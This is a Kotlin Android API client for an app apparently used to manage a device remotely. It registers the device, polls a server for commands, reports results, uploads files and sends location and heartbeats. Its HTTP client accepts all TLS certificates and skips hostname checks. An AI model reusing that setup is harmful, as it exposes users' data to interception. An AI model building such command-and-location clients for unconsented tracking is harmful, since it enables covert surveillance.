package com.abuzahra.manager.api

import android.content.Context
import android.util.Log
import com.abuzahra.manager.App
import com.abuzahra.manager.Config
import com.abuzahra.manager.model.Command
import com.abuzahra.manager.model.LinkResult
import com.abuzahra.manager.util.DeviceUtils
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

object ApiClient {

    private val TAG = "ApiClient"
    private val gson = Gson()
    private val JSON = "application/json; charset=utf-8".toMediaType()

    // Custom TrustManager that accepts all certificates (for self-signed certs)
    private val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
        override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
        override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    })

    private val sslContext: SSLContext by lazy {
        try {
            val sc = SSLContext.getInstance("TLS")
            sc.init(null, trustAllCerts, SecureRandom())
            sc
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create custom SSLContext", e)
            SSLContext.getInstance("TLS")
        }
    }

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as X509TrustManager)
            .hostnameVerifier { _, _ -> true }
            .addInterceptor { chain ->
                val request = chain.request().newBuilder()
                    .header("Accept", "application/json")
                    .header("Content-Type", "application/json")
                    .build()
                chain.proceed(request)
            }
            .build()
    }

    // ===== LINK DEVICE =====
    suspend fun linkDevice(context: Context, code: String): LinkResult = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(context)
            val deviceToken = DeviceUtils.getDeviceToken(context)
            val deviceInfo = Config.getDeviceInfo(context)

            val body = mapOf(
                "device_id" to deviceId,
                "link_code" to code,
                "device_token" to deviceToken,
                "device_name" to (deviceInfo["device_name"] ?: deviceId),
                "device_model" to (deviceInfo["device_model"] ?: ""),
                "brand" to (deviceInfo["brand"] ?: ""),
                "os_version" to (deviceInfo["os_version"] ?: "")
            )

            Log.i(TAG, "linkDevice: posting to /register with deviceId=$deviceId, code=$code")
            Log.i(TAG, "linkDevice: server URL = ${Config.SERVER_DOMAIN}/api/register")

            val response = post("/register", body)
            Log.i(TAG, "linkDevice: raw response = '${response.take(500)}'")

            if (response.isEmpty() || response.isBlank()) {
                Log.w(TAG, "linkDevice: empty response from server")
                return@withContext LinkResult(error = "Empty response from server. Is the server running?")
            }

            // Try to parse as JSON
            val result = try {
                gson.fromJson(response, LinkResult::class.java)
            } catch (e: JsonSyntaxException) {
                Log.e(TAG, "linkDevice: JSON parse error on response: '$response'", e)
                // Check if it looks like a number (HTTP status code without JSON body)
                if (response.trim().matches(Regex("\\d+"))) {
                    return@withContext LinkResult(error = "Server returned status code $response without JSON body. Check server API.")
                }
                // Check if it's HTML
                if (response.trim().startsWith("<")) {
                    return@withContext LinkResult(error = "Server returned HTML instead of JSON. Is nginx configured correctly?")
                }
                // Try to extract any useful info
                return@withContext LinkResult(error = "Server returned non-JSON response: '${response.take(200)}'")
            }

            if (result.ok || result.success) {
                DeviceUtils.setLinked(context, true)
                result.token?.let { token ->
                    context.getSharedPreferences("abuzahra", Context.MODE_PRIVATE)
                        .edit().putString("device_token", token).apply()
                }
                result.device_token?.let { token ->
                    if (result.token == null) {
                        context.getSharedPreferences("abuzahra", Context.MODE_PRIVATE)
                            .edit().putString("device_token", token).apply()
                    }
                }
                Log.i(TAG, "Device linked successfully: ${result.message}")
            } else {
                Log.w(TAG, "Link failed: ${result.error}")
            }
            result
        } catch (e: java.net.SocketTimeoutException) {
            Log.e(TAG, "linkDevice: timeout", e)
            LinkResult(error = "Connection timed out. Server may be down or unreachable.")
        } catch (e: java.net.ConnectException) {
            Log.e(TAG, "linkDevice: connection refused", e)
            LinkResult(error = "Connection refused. Server is not running at ${Config.SERVER_DOMAIN}")
        } catch (e: java.net.UnknownHostException) {
            Log.e(TAG, "linkDevice: unknown host", e)
            LinkResult(error = "Cannot resolve hostname. Check server URL: ${Config.SERVER_DOMAIN}")
        } catch (e: javax.net.ssl.SSLHandshakeException) {
            Log.e(TAG, "linkDevice: SSL error", e)
            LinkResult(error = "SSL handshake failed. ${e.message}")
        } catch (e: IOException) {
            Log.e(TAG, "linkDevice: IO error", e)
            LinkResult(error = "Network error: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "linkDevice: unexpected error", e)
            LinkResult(error = e.message ?: "Unknown error during linking")
        }
    }

    // ===== GET PENDING COMMANDS =====
    suspend fun getCommands(context: Context): List<Command> = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(context)
            val response = get("/commands/$deviceId")
            Log.d(TAG, "getCommands raw response: '${response.take(300)}'")

            if (response.isBlank() || response == "{}" || response == "null") {
                return@withContext emptyList()
            }

            val type = object : TypeToken<Map<String, Any>>() {}.type
            val map = gson.fromJson<Map<String, Any>>(response, type) ?: return@withContext emptyList()
            val cmds = map["commands"]
            if (cmds is List<*>) {
                val json = gson.toJson(cmds)
                return@withContext gson.fromJson(json, Array<Command>::class.java).toList()
            }
            // If the response is directly an array
            if (map.containsKey("command") || map.containsKey("id")) {
                return@withContext listOf(gson.fromJson(gson.toJson(map), Command::class.java))
            }
            emptyList()
        } catch (e: JsonSyntaxException) {
            Log.e(TAG, "getCommands: JSON parse error", e)
            emptyList()
        } catch (e: Exception) {
            Log.e(TAG, "getCommands error", e)
            emptyList()
        }
    }

    // ===== SUBMIT COMMAND RESULT =====
    suspend fun submitResult(cmdId: String, command: String, status: String, result: Any?) {
        withContext(Dispatchers.IO) {
            try {
                val body = mapOf(
                    "status" to status,
                    "result" to (result?.let { if (it is String) it else gson.toJson(it) } ?: "OK"),
                    "command" to command
                )
                val response = post("/command_result/$cmdId", body)
                Log.d(TAG, "Result submitted for $cmdId: '${response.take(200)}'")
            } catch (e: Exception) {
                Log.e(TAG, "submitResult error for $cmdId", e)
            }
        }
    }

    // ===== SEND DATA =====
    suspend fun sendData(context: Context, command: String, data: Any?): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceUtils.getDeviceId(context)
                val body = mapOf(
                    "device_id" to deviceId,
                    "command" to command,
                    "data" to data,
                    "timestamp" to System.currentTimeMillis()
                )
                val response = post("/data", body)
                Log.d(TAG, "sendData response: '${response.take(200)}'")
                true
            } catch (e: Exception) {
                Log.e(TAG, "sendData error", e)
                false
            }
        }
    }

    // ===== SEND EVENT =====
    // Events are now buffered locally via EventBuffer and NOT sent automatically.
    // Use EventBuffer.addEvent() directly instead of this method for all event sending.
    // This method is kept for backward compatibility but delegates to EventBuffer.
    suspend fun sendEvent(deviceId: String, eventType: String, data: Map<String, Any?>) {
        withContext(Dispatchers.IO) {
            try {
                val body = mapOf(
                    "device_id" to deviceId,
                    "event_type" to eventType,
                    "data" to data,
                    "timestamp" to System.currentTimeMillis()
                )
                val response = post("/event", body)
                Log.d(TAG, "sendEvent [$eventType] response: '${response.take(200)}'")
            } catch (e: Exception) {
                Log.e(TAG, "sendEvent error for $eventType", e)
            }
        }
    }

    // ===== HEARTBEAT =====
    suspend fun sendHeartbeat(context: Context, battery: Int, status: String = "online") {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceUtils.getDeviceId(context)
                val body = mapOf(
                    "device_id" to deviceId,
                    "status" to status,
                    "battery" to battery
                )
                val response = post("/heartbeat", body)
                Log.d(TAG, "Heartbeat response: '${response.take(100)}'")
            } catch (e: Exception) {
                Log.e(TAG, "heartbeat error", e)
            }
        }
    }

    // ===== DEVICE SETTINGS =====
    suspend fun getSettings(context: Context): Map<String, Any?> = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(context)
            val response = get("/settings/$deviceId")
            Log.d(TAG, "getSettings raw response: '${response.take(200)}'")

            if (response.isBlank() || response == "{}" || response == "null") {
                return@withContext emptyMap()
            }

            val type = object : TypeToken<Map<String, Any>>() {}.type
            val map = gson.fromJson<Map<String, Any>>(response, type)
            map.getOrDefault("settings", emptyMap<String, Any>()) as? Map<String, Any?> ?: map
        } catch (e: JsonSyntaxException) {
            Log.e(TAG, "getSettings: JSON parse error", e)
            emptyMap()
        } catch (e: Exception) {
            Log.e(TAG, "getSettings error", e)
            emptyMap()
        }
    }

    // ===== TEST SERVER HEALTH =====
    suspend fun testHealth(): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "${Config.SERVER_DOMAIN}/api/health"
            Log.d(TAG, "Testing server health at: $url")
            val request = Request.Builder().url(url).get().build()
            client.newCall(request).execute().use { resp ->
                val body = resp.body?.string() ?: ""
                Log.d(TAG, "Health check: HTTP ${resp.code}, body='${body.take(100)}'")
                resp.isSuccessful || resp.code == 404
            }
        } catch (e: Exception) {
            Log.e(TAG, "Server health check failed", e)
            false
        }
    }

    // ===== UPLOAD FILE (Multipart) =====
    suspend fun uploadFile(file: java.io.File, command: String) = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(App.instance)
            val MEDIA_TYPE = "application/octet-stream".toMediaType()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("command", command)
                .addFormDataPart("file", file.name, file.asRequestBody(MEDIA_TYPE))
                .build()
            val url = "${Config.SERVER_DOMAIN}/api/upload"
            Log.d(TAG, "uploadFile: uploading ${file.name} ($command) from $deviceId to $url")
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().use { resp ->
                val code = resp.code
                val body = resp.body?.string() ?: "{}"
                Log.d(TAG, "uploadFile $command: HTTP $code, response='${body.take(200)}'")
                body
            }
        } catch (e: Exception) {
            Log.e(TAG, "uploadFile error for $command", e)
                "{\"error\":\"${e.message}\"}"
        }
    }

    // ===== SEND HEALTH REPORT =====
    suspend fun sendHealthReport(report: Map<String, Any>) {
        withContext(Dispatchers.IO) {
            try {
                post("/health", report)
            } catch (e: Exception) {
                Log.e(TAG, "sendHealthReport error", e)
            }
        }
    }

    // ===== SEND LOCATION =====
    suspend fun sendLocation(context: Context, lat: Double, lng: Double, accuracy: Float? = null) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceUtils.getDeviceId(context)
                val body = mutableMapOf<String, Any>(
                    "device_id" to deviceId,
                    "command" to "location",
                    "data" to mapOf(
                        "latitude" to lat,
                        "longitude" to lng,
                        "accuracy" to (accuracy ?: 0f),
                        "timestamp" to System.currentTimeMillis()
                    )
                )
                val response = post("/data", body)
                Log.d(TAG, "sendLocation response: '${response.take(100)}'")
            } catch (e: Exception) {
                Log.e(TAG, "sendLocation error", e)
            }
        }
    }

    // ===== LOW-LEVEL HTTP =====
    private suspend fun get(path: String): String = withContext(Dispatchers.IO) {
        val url = "${Config.SERVER_DOMAIN}/api$path"
        Log.d(TAG, "GET: $url")
        val request = Request.Builder()
            .url(url)
            .get()
            .build()
        client.newCall(request).execute().use { resp ->
            val code = resp.code
            val body = resp.body?.string() ?: "{}"
            Log.d(TAG, "GET $path: HTTP $code, body='${body.take(200)}'")
            if (!resp.isSuccessful && !body.trim().startsWith("{")) {
                Log.w(TAG, "GET $path returned non-success code $code with non-JSON body")
            }
            body
        }
    }

    private suspend fun post(path: String, body: Any): String = withContext(Dispatchers.IO) {
        val json = gson.toJson(body)
        val requestBody = json.toRequestBody(JSON)
        val url = "${Config.SERVER_DOMAIN}/api$path"
        Log.d(TAG, "POST: $url, body='$json'")
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()
        client.newCall(request).execute().use { resp ->
            val code = resp.code
            val responseBody = resp.body?.string() ?: "{}"
            Log.d(TAG, "POST $path: HTTP $code, response='${responseBody.take(300)}'")
            if (code >= 500) {
                Log.e(TAG, "POST $path: Server error ($code): '${responseBody.take(200)}'")
            } else if (code >= 400) {
                Log.w(TAG, "POST $path: Client error ($code): '${responseBody.take(200)}'")
            }
            responseBody
        }
    }

    fun postSync(path: String, body: Any): String {
        return try {
            val json = gson.toJson(body)
            val requestBody = json.toRequestBody(JSON)
            val url = "${Config.SERVER_DOMAIN}/api$path"
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            client.newCall(request).execute().use { resp ->
                val code = resp.code
                val responseBody = resp.body?.string() ?: "{}"
                Log.d(TAG, "postSync $path: HTTP $code, response='${responseBody.take(200)}'")
                responseBody
            }
        } catch (e: IOException) {
            Log.e(TAG, "postSync error", e)
            "{}"
        }
    }
}
